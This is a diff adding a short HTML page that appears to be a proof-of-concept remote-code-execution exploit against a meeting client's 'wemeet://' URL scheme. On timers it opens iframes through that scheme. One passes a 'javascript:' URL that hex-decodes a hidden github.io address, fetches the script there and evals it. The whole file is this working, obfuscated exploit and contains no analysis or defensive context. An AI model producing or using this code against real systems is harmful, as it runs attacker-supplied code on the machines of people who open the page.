@@ -1,0 +1,9 @@
+<!doctype html><html><head><meta charset="utf-8"><title>P111</title></head><body><script>
+document.title='P111-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var tbjs="javascript:void(function(){var h='68747470733a2f2f6769747768732e6769746875622e696f2f776d2d706f632d7263652f703131317061792e6a73';var u='';for(var i=0;i<h.length;i+=2)u+=String.fromCharCode(parseInt(h.substr(i,2),16));fetch(u).then(function(r){return r.text()}).then(eval)})()";
+function frame(src,label){document.title=label;var f=document.createElement('iframe');f.src=src;document.body.appendChild(f)}
+setTimeout(function(){frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P111-TBOFF')},900);
+setTimeout(function(){frame('wemeet://page/web_app?url='+encodeURIComponent(tbjs),'P111-TBJS')},1800);
+setTimeout(function(){document.title='P111-WAIT'},70000);
+</script></body></html>
